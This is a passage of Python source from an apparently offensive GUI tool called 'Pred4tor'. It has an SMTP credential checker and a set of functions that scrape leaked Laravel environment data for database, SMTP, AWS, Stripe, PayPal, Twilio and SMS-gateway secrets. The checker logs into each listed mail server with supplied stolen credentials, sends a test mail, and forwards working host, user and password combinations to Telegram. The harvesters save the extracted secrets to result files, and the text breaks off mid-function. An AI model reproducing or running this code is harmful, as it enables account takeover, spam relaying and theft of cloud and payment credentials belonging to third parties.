        self.sMtps_textbox = customtkinter.CTkTextbox(self.smtpChecker_app, width=410, height=340)
        self.sMtps_textbox.grid(row=0, column=0, sticky="nsew")
        self.sMtps_textbox.insert("0.0", "host|port|user|pass")

        self.ChekerimPort_button = customtkinter.CTkButton(master=self.smtpChecker_app, text="Import", command=self.import_smtPlst)
        self.ChekerimPort_button.place(relx=0.9, rely=0.1, anchor=customtkinter.CENTER)

        self.exPort_button = customtkinter.CTkButton(master=self.smtpChecker_app, text="Export", command=self.export_smtPlst)
        self.exPort_button.place(relx=0.9, rely=0.2, anchor=customtkinter.CENTER)

        self.ReSult_button = customtkinter.CTkButton(master=self.smtpChecker_app, text="Result", command=self.opensCres)
        self.ReSult_button.place(relx=0.9, rely=0.3, anchor=customtkinter.CENTER)

        try:
            with open('core/settings.json', 'r', encoding='utf-8') as settings_data:
                xdb = json.load(settings_data)
                
            demail = xdb['email']
        except Exception as err:
            consolelog('INFO', err)
            demail = "Your Email Here"

        uEmail = customtkinter.StringVar(value=demail)
        self.testEmail = customtkinter.CTkEntry(master=self.smtpChecker_app, width=135, height=30, textvariable=uEmail)
        self.testEmail.place(relx=0.9, rely=0.42, anchor=customtkinter.CENTER)
        self.testEmail.bind("<Enter>", lambda e:self.tEmailAnim())
        self.testEmail.bind("<Leave>", lambda e:self.tEmailAnimOut())

        
        self.smtpSplitVar = customtkinter.CTkComboBox(master=self.smtpChecker_app, width=100, values=["Custom", "host|port|user|pass", "host,port,user,pass", "host port user pass"],)
        self.smtpSplitVar.place(relx=0.88, rely=0.6, anchor=customtkinter.CENTER)

      
        self.bots_slider = customtkinter.CTkSlider(master=self.smtpChecker_app, from_=1, to=50, command=self.bots_value, width=120)
        self.bots_slider.place(relx=0.88, rely=0.78, anchor=customtkinter.CENTER)
        self.bots_slider.set(1)

        self.bots_txt = customtkinter.CTkLabel(master=self.smtpChecker_app, text=f"1", fg_color="transparent")
        self.bots_txt.place(relx=0.9, rely=0.7, anchor=customtkinter.CENTER)
        self.bots_txt2 = customtkinter.CTkLabel(master=self.smtpChecker_app, text=f"Threads:", fg_color="transparent")
        self.bots_txt2.place(relx=0.82, rely=0.7, anchor=customtkinter.CENTER)


        
        self.sCstart_button = customtkinter.CTkButton(master=self.smtpChecker_app, command=self.startsChecker, text="Start")
        self.sCstart_button.place(relx=0.9, rely=0.9, anchor=customtkinter.CENTER)

    def import_smtPlst(self):
        try:
            self.sMtps_textbox.delete("0.0", "end")
            userlist = filedialog.askopenfilename()
            
            with open(userlist, 'r', encoding='utf-8') as f:
                fulltxt = f.read()
            
            self.sMtps_textbox.insert("0.0", fulltxt + '\n')

            self.auto_function()
        except:
            console.print_exception(show_locals=True)

    def opensCres(self):
        self.auto_function()
        self.GetResult('Result/SmtpChecker/result.txt')

    def tEmailAnim(self):
        self.testEmail.place(relx=0.9, rely=0.42, anchor=customtkinter.CENTER)

    def tEmailAnimOut(self):
        self.testEmail.place(relx=0.96, rely=0.42, anchor=customtkinter.CENTER)

    def bots_value(self, value):
        botsvar =  int(value)
        self.bots_txt.configure(text=f"{botsvar}")

    def export_smtPlst(self):
        smtps_res = self.sMtps_textbox.get("0.0", "end")
    
        # with filedialog.asksaveasfile(mode='w', filetypes=[("txt file", ".txt")], defaultextension=".txt") as myFile:
        #     myFile.write(smtps_res)
        filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
        
        if str(filename) == "None":
            return
        
        with open(filename, 'w', encoding='utf-8') as fh:
            fh.write(smtps_res)

        self.auto_function()
        return self.show_checkmark('Success', 'Exported Successfully.')
    
    def startsChecker(self):
        global stopSmtpChecker
        global ValidSmtps
        global BadSmtps
        global InScopeSmtps

        InScopeSmtps = []

        ValidSmtps = 0
        BadSmtps = 0
        stopSmtpChecker = 'false'
        smTpType = self.smtpSplitVar.get()
        CheckerBots = self.bots_slider.get()
        uemail = self.testEmail.get()

        if uemail == 'Your Email':
            return self.show_info(':D', 'Enter your Email')
        
        if '@' not in uemail:
            return self.show_info(':D', 'Invalid Email!')

        try:
            with open('core/settings.json', 'r', encoding='utf-8') as settings_data:
                xdb = json.load(settings_data)
            
            xdb['email'] = uemail

            with open("core/settings.json", "w", encoding='utf-8') as fixone:
                json.dump(xdb, fixone)

        except Exception as err:
            return self.show_error('Error!', err)

        
        if smTpType == 'Custom':
            return self.show_info(':D', 'Enter Split value')

        smtpLst = self.sMtps_textbox.get("0.0", "end")

        if len(smtpLst) > 1:
            pass
        else:
            return self.show_info(':D', 'No SMTP Combo!')

        if smtpLst.replace('\n', '') == 'host|port|user|pass':
            return self.show_info(':D', 'No SMTP Combo!')

        if smTpType == 'host|port|user|pass':
            smTpType = "|"
        elif smTpType == 'host,port,user,pass':
            smTpType = ","
        elif smTpType == 'host port user pass':
            smTpType = " "
        else:
            pass

        try:
            with open('tmp/smtpChecker.txt', 'w', encoding="utf-8") as f:
                f.write(smtpLst)           
        except Exception as err:
            return console.print_exception(show_locals=True)

        try:
            with open('tmp/smtpChecker.txt', 'r', encoding="utf-8") as f:
                InScopeSmtps = list(f)           
        except Exception as err:
            return console.print_exception(show_locals=True)
        
        self.sCstart_button.configure(text="Stop", command=self.StopSmtpChecker)
        self.sMtps_textbox.delete("0.0", "end")
        self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')

        
        consolelog('INFO', "Starting SMTP Checker...")
        for bot in range(int(CheckerBots)):
            bot = threading.Thread(target=self.smTpChecker, args=(smTpType, uemail))
            bot.daemon = True
            bot.start()

    def smTpChecker(self, sp, uemail):
        global ValidSmtps
        global stopSmtpChecker
        global InScopeSmtps
        global BadSmtps
        global smtpCheckerOneBot

        smtpCheckerOneBot = True
        while True:
            if stopSmtpChecker == 'true':
                break

            if len(InScopeSmtps) == 0:
                break
            
            self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')
            inScopeSmtp = Xchoice(InScopeSmtps).replace('\n', '')

            if len(inScopeSmtp) > 1:
                pass
            else:
                consolelog('INFO', f"{inScopeSmtp} > BAD FORMAT")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
                continue

        
            try:
                uhost = inScopeSmtp.split(sp)[0]
                uport = inScopeSmtp.split(sp)[1]
                user = inScopeSmtp.split(sp)[2]
                pwd = inScopeSmtp.split(sp)[3]

                consolelog('INFO', f'Checking > {inScopeSmtp}')
                
            except Exception as err:
                consolelog('WARNING', f"{inScopeSmtp} > {err}")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
                continue
                
            
        
            if uhost == '' or uhost == None:
                consolelog('INFO', f"{inScopeSmtp} > HOST > BAD FORMAT")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
            elif uport == '' or uport == None:
                consolelog('INFO', f"{inScopeSmtp} > PORT > BAD FORMAT")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
            elif user == '' or user == None:
                consolelog('INFO', f"{inScopeSmtp} > USER > BAD FORMAT")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
            elif pwd == '' or pwd == None:
                consolelog('INFO', f"{inScopeSmtp} > PASS > BAD FORMAT")
                InScopeSmtps.remove(f"{inScopeSmtp}\n")
            
            else:
                try:

                    #with open('core/html/letter.html', 'w', encoding="utf-8") as f:
                    #    f.write('<html lang="en">\n\n<body>\n<p>Host: <HOST></p>\n<p>PORT: <PORT></p>\n<p>USER: <USER></p>\n<p>PASS: #<PASS></p>\n</body>\n</html>')
                    
                    # with open('core/html/letter.html', 'w', encoding="utf-8") as f:
                    #     f.write('<HOST>|<PORT>|<USER>|<PASS>')
                    with open('core/html/letter.html', 'w', encoding="utf-8") as f:
                        f.write('<HOST>')

                    with open('core/html/letter.html', 'r', encoding="utf-8") as f:
                        testLetter = f.read()
                    
                    testLetter = testLetter.replace('<HOST>', uhost).replace('<PORT>', uport).replace('<USER>', user).replace('<PASS>', pwd)
                    with open('core/html/letter.html', 'w', encoding="utf-8") as f:
                        f.write(testLetter)

                except Exception as err:
                    self.show_error('Error!', err)
                    consolelog('WARNING', f"{inScopeSmtp} > {err}")
                    break
            

                if str(uport) == "465":
                    message = EmailMessage()
                    message["From"] = user
                    message["To"] = uemail
                    message["Subject"] = "Pred4tor Ch3ck3r"

                    with open('core/html/letter.html', 'r', encoding="utf-8") as fp:
                        message.set_content(fp.read(), 'html')
                    
                    try:
                        # no need for a context if you are just using the default SSL
                        with smtplib.SMTP_SSL(uhost, 465, timeout=15000) as server:
                            server.login(user, pwd)
                            # Prefer the modern send_message method
                            server.send_message(message)
                            server.quit()
                        
                        
                        consolelog('INFO', f"{inScopeSmtp} > VALID")
                        ValidSmtps += 1
                        self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')

                        with open('Result/SmtpChecker/result.txt', 'a', encoding="utf-8") as f:
                            f.write(inScopeSmtp + '\n')
                            
                        InScopeSmtps.remove(f"{inScopeSmtp}\n")
                        
                        self.sMtps_textbox.insert("0.0", inScopeSmtp + '\n')
                        self.send_to_telegram(f"🤗SMTP CHECKER\n <code> {uhost}|{uport}|{user}|{pwd} </code>")
                
                    
                    except Exception as err:
                        BadSmtps += 1
                        consolelog('INFO', f"{inScopeSmtp} > BAD")
                        self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')

                        InScopeSmtps.remove(f"{inScopeSmtp}\n")
                        
                
                else:
                    message = f"Subject: Pred4tor\nFrom: {user}\nTo: {uemail}\nContent-Type: text/html\n\n{testLetter}" #This is where the stuff happens

                    try:
                        msg = EmailMessage()

                        with open('core/html/letter.html', 'r', encoding="utf-8") as fp:
                            msg.set_content(fp.read(), subtype='html')

                        msg['Subject'] = "Pred4tor Ch3ck3r"
                        msg['From'] = user
                        msg['To'] = uemail
                        with smtplib.SMTP(uhost, int(uport), timeout=15000) as smtp:
                            smtp.starttls()
                            smtp.login(user, pwd)
                            smtp.send_message(msg)
                            smtp.quit()

                        consolelog('INFO', f"{inScopeSmtp} > VALID")

                        ValidSmtps += 1
                        self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')

                        with open('Result/SmtpChecker/result.txt', 'a', encoding="utf-8") as f:
                            f.write(inScopeSmtp + '\n')
                    
                        self.sMtps_textbox.insert("0.0", inScopeSmtp + '\n')

                        InScopeSmtps.remove(f"{inScopeSmtp}\n")
                      
                        self.send_to_telegram(f"🤗SMTP CHECKER\n <code> {uhost}|{uport}|{user}|{pwd} </code>")

                    except Exception as err:
                        BadSmtps += 1
                        consolelog('INFO', f"{inScopeSmtp} > BAD")
                        self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)}')
                        
                        InScopeSmtps.remove(f"{inScopeSmtp}\n")
                        
        if smtpCheckerOneBot == True:
            smtpCheckerOneBot = False
            self.sCstart_button.configure(text="Start", command=self.startsChecker, state="normal")
            self.smtpChecker_app.title(f'SMTP Checker > Valid: {ValidSmtps}, Bad: {BadSmtps}, InScope: {len(InScopeSmtps)} ')

            consolelog('INFO', f"SMTP Checker Stop")

    def StopSmtpChecker(self):
        global stopSmtpChecker

        stopSmtpChecker = 'true'
        self.sCstart_button.configure(state="disabled")
 

    def get_db(self, data):
        global TotalDBsHits

        try:   
            host = re.findall("\nDB_HOST=(.*?)\n", data)
            for xhost in host:
                cfghost = xhost
                break
            if "null" in str(cfghost):
                return
            elif str(cfghost) == "mysql":
                return
            elif str(cfghost) == "db":
                return
            
            elif len(str(cfghost)) == 0 or len(str(cfghost)) == 1:
                return
            elif "localhost" in str(cfghost) or "127.0.0.1" in str(cfghost):
                return
            
            port = re.findall("\nDB_PORT=(.*?)\n",data)
            for xport in port:
                cfgport = xport
                break

            if "null" in str(cfgport):
                return
            if len(str(cfgport)) == 0 or len(str(cfgport)) == 1:
                return
            
            database = re.findall("\nDB_DATABASE=(.*?)\n", data)

            for xdb in database:
                cfgdb = xdb
                break
            
            if "null" in str(cfgdb):
                return 
            if len(str(cfgdb)) == 0 or len(str(cfgdb)) == 1:
                return

            dbusername = re.findall("\nDB_USERNAME=(.*?)\n", data)
            for xuser in dbusername:
                cfguser = xuser
                break
            
            if "null" in str(cfguser):
                return
            if len(str(cfguser)) == 0 or len(str(cfguser)) == 1:
                return
           
            dbpwd = re.findall("\nDB_PASSWORD=(.*?)\n", data)
            for xdbpwd in dbpwd:
                cfgpwd = xdbpwd
                break
            
         
            if "null" in str(cfgpwd):
                return
            if len(str(cfgpwd)) == 0 or len(str(cfgpwd)) == 1:
                return

            dbinfo = str(f"DB_HOST={cfghost}\nDB_PORT={cfgport}\nDB_DATABASE={cfgdb}\nDB_USERNAME={cfguser}\nDB_PASSWORD={cfgpwd}\n<---------->\n")[1:-1]
            

            dele = ["\r",'"',"'","(",")"]
            for w in dele:
                dbinfo = dbinfo.replace(w,"")
 
            else:
                try:
                    with open("Result/Laravel/DBs.txt", "a+", encoding="utf-8") as f:
                        f.write(f'{dbinfo}\n')

                    TotalDBsHits += 1

                    self.dbs_res.configure(text=f"DBs: {TotalDBsHits}")
                except Exception as err:
                    console.print_exception(show_locals=True)
                
        except:
            pass
               
    def get_clickatell(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'clickatell_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if ('clickatell' in str(out).lower() or 'key' in str(out).lower()):
            try:
                with open('Result/Laravel/clickatell.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_skebby(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'skebby_' in str(x).lower() or 'skbby_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if ('skebby' in str(out).lower() or 'skbby' in str(out).lower()):
            try:
                with open('Result/Laravel/skebby.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_smtp(self, data):
        global TotalSmtpsHits

        try:   
            host = re.findall("\nMAIL_HOST=(.*?)\n", data)

            for xhost in host:
                cfghost = xhost
                break
            if "null" in str(cfghost):
                return
            elif len(str(cfghost)) == 0:
                return
            
            port = re.findall("\nMAIL_PORT=(.*?)\n",data)
            for xport in port:
                cfgport = xport
                break
            if "null" in str(cfgport):
                return
            elif len(str(cfgport)) == 0:
                return
            
            user = re.findall("\nMAIL_USERNAME=(.*?)\n", data)
            for xuser in user:
                cfguser = xuser
                break
            if "null" in str(cfguser):
                return
            elif len(str(cfguser)) == 0:
                return
            
            pswd = re.findall("\nMAIL_PASSWORD=(.*?)\n", data)
            for xpwd in pswd:
                cfgpwd = xpwd
                break
            if "null" in str(cfgpwd):
                return
            elif len(str(cfgpwd)) == 0:
                return
            
            smtp = f"{cfghost}|{cfgport}|{cfguser}|{cfgpwd}"
            dele = ["\r",'"',"'","(",")"]
            for w in dele:
                smtp = smtp.replace(w,"")

            smtp = smtp.replace(", ", '|')
            try:
                with open("Result/Laravel/smtp.txt", "a+", encoding="utf-8") as f:
                    f.write(f'{smtp}\n')

                TotalSmtpsHits += 1

                self.smtp_res.configure(text=f"SMTP: {TotalSmtpsHits}")

            except:
                pass
                
        except:
            pass

    def get_aruba(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'aruba_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'aruba' in str(out).lower():
            try:
                with open('Result/Laravel/aruba.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_plivo(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'plivo_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'plivo' in str(out).lower():
            try:
                with open('Result/Laravel/plivo.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_aws(self, source):
        global TotalAwsHits

        blacklistedkeywords = ['bucket','user','backend','url','path','poster','event','faq','profile','complaint','card','task','driver','db','queue','kourses','token']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'aws_' in str(x).lower() or 's3_' in str(x).lower() or 'ses_' in str(x).lower() or 'laravel_' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'http' not in str(s).split('=')[1]:
                        if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                            if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                                out += s + '\n'
        if 'key' in str(out).lower() and 'secret' in str(out).lower():
            try:
                TotalAwsHits += 1
                self.aws_res.configure(text=f"AWS: {TotalAwsHits}")

                try:
                    with open('Result/Laravel/awsFULL.txt', 'a', encoding="utf-8") as f:
                        f.write(f'<---------->{out}\n')

                except Exception as err:
                    console.print_exception(show_locals=True)

            except:
                pass


            try:
                lid = 0
                regionx = re.findall("REGION=(.*?)\n", out)
                akeysx = re.findall("ACCESS_KEY=(.*?)\n", out)
                keysidsx = re.findall("KEY_ID=(.*?)\n", out)
                for x in akeysx:
                    vregion = regionx[lid].replace('\n', '')
                    vaccesskey = akeysx[lid].replace('\n', '')
                    vkeysid = keysidsx[lid].replace('\n', '')
                    try:
                        with open('Result/Laravel/aws.txt', 'a', encoding="utf-8") as f:
                            f.write(f'{vkeysid}:{vaccesskey}:{vregion}\n')

                    except Exception as err:
                        console.print_exception(show_locals=True)

                    lid += 1
            except Exception as err:
                console.print_exception(show_locals=True)

    def get_stripe(self, source):
        global TotalStripeHits

        blacklistedkeywords = ['product','price']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'stripe' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '|'
        if 'stripe' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
            try:
                with open('Result/Laravel/stripe.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalStripeHits += 1
                self.stripe_res.configure(text=f"Stripe: {TotalStripeHits}")

            except:
                pass

    def get_razorpay(self, source):
        global TotalRazorpayHits

        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'razorpay' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '|'
        if 'razorpay' in str(out).lower() and 'key' in str(out).lower():
            try:
                with open('Result/Laravel/razorpay.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalRazorpayHits += 1
                self.RazorPay_res.configure(text=f"RazorPay: {TotalRazorpayHits}")
            except:
                pass

    def get_twilio(self, source):
        global TotalTwilioHits

        blacklistedkeywords = ['twiml','profile','key','verify','chat','call','plivo','test','service','notification','path']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'twilio' in str(x).lower() or 'twillo' in str(x).lower() or 'twillio' in str(x).lower() or 'auth_token' in str(x).lower() or 'account_sid' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
        if ('twilio' in str(out).lower() or 'twillo' in str(out).lower() or 'twillio' in str(out).lower()) and ('sid' in str(out).lower() or 'id' in str(out).lower()) and 'token' in str(out).lower():
            try:
                with open('Result/Laravel/twilioFULL.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalTwilioHits += 1

                self.twilio_res.configure(text=f"Twilio: {TotalTwilioHits}")

            except:
                pass

            try:
                lid = 0
                basex = re.findall("--->\n(.*?)<-", out)
                for xb in basex:
                    isdx = re.findall("(?:SID=|SID =|TWILIO_USER_ID=|TWILIO_USER_ID =)(.*?)\n", xb)
                    tknx = re.findall("(?:TOKEN=|TOKEN =)(.*?)\n", xb)
                    fromx = re.findall("(?:NUMBER=|NUMBER =|NO=|NO =|FROM=|FROM =)(.*?)\n", xb)
                    for x in isdx:
                        isdxT = isdx[lid]
                        tknxT = tknx[lid]
                        fromc = fromx[lid]
                        vsid = isdxT.replace('\n', '').replace("'", '').replace('"', '')
                        vtkn = tknxT.replace('\n', '').replace("'", '').replace('"', '')
                        vfrom = fromc.replace('\n', '').replace("'", '').replace('"', '')
                        try:
                            with open('Result/Laravel/twilio.txt', 'a', encoding="utf-8") as f:
                                f.write(f'{vsid}:{vtkn}:{vfrom}\n')

                        except Exception as err:
                            console.print_exception(show_locals=True)

                        lid += 1

            except Exception as err:
                console.print_exception(show_locals=True)

    def get_nexmo(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'nexmo' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'nexmo' in str(out).lower() and 'key' in str(out).lower() and 'secret' in str(out).lower():
            try:
                with open('Result/Laravel/nexmo.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_paypal_sandbox(self, source):
        global TotalpaypalSHits

        blacklistedkeywords = ['certificate']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'paypal_sandbox' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
        if 'paypal_sandbox' in str(out).lower() and ('username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
            try:
                with open('Result/Laravel/paypal_sandbox.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalpaypalSHits += 1
                self.PaypalS_res.configure(text=f"PP Sandbox: {TotalpaypalSHits}")
            except:
                pass

    def get_paypal_live(self, source):
        global TotalpaypalLHits

        blacklistedkeywords = ['certificate']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'paypal_live' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
        if 'paypal_live' in str(out).lower() and( 'username' in str(out).lower() or 'password' in str(out).lower() or 'secret' in str(out).lower() or 'id' in str(out).lower()):
            try:
                with open('Result/Laravel/paypal_live.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalpaypalLHits += 1
                self.PaypalLive_res.configure(text=f"PP Live: {TotalpaypalLHits}")
            except:
                pass

    def get_onesignal(self, source):
        global TotalOsHits

        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'onesignal' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'onesignal' in str(out).lower() and 'key' in str(out).lower():
            try:
                with open('Result/Laravel/onesignal.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalOsHits += 1
                self.OneSignal_res.configure(text=f"OneSignal: {TotalOsHits}")
            except:
                pass

    def get_telnyx(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'telnyx_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'telnyx' in str(out).lower() and ('number' in str(out).lower() or 'from' in str(out).lower()) and 'secret' in str(out).lower():
            try:
                with open('Result/Laravel/telnyx.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_textlocal(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'textlocal_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'textlocal' in str(out).lower() and 'key' in str(out).lower():
            try:
                with open('Result/Laravel/textlocal.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_value_leaf(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'value_leaf_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'value_leaf' in str(out).lower() and 'key' in str(out).lower() and 'username' in str(out).lower() and 'password' in str(out).lower():
            try:
                with open('Result/Laravel/value_leaf.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_sms(self, source):
        global TotalSmsHits

        blacklistedkeywords = ['disabled','image/png','data:']
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'sms' in str(x).lower():
                tt = 0
                for aze in blacklistedkeywords:
                    if str(aze).lower() in str(x).lower():
                        tt +=1
                if tt == 0:
                    if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                        if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                            out += s + '\n'
        if 'sms' in str(out).lower():
            try:
                with open('Result/Laravel/sms.txt', 'a', encoding="utf-8") as f:
                    f.write(f'<----------->\n{out}\n')

                TotalSmsHits += 1
                self.sms_res.configure(text=f"SMS: {TotalSmsHits}")

            except:
                pass

    def get_openpay(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'openpay_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'openpay' in str(out).lower() and ('key' in str(out).lower() or 'client' in str(out).lower() or 'secret' in str(out).lower() or 'public' in str(out).lower()):
            try:
                with open('Result/Laravel/openpay.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_clicksend(self, source):
        global TotalClicksendHits

        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'clicksend_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'clicksend' in str(out).lower() and 'username' in str(out).lower() and 'key' in str(out).lower():
            try:
                with open('Result/Laravel/clicksend.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')

                TotalClicksendHits += 1
                self.Clicksend_res.configure(text=f"ClickSend: {TotalClicksendHits}")
            except:
                pass

    def get_xgate(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'xgate_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'xgate' in str(out).lower():
            try:
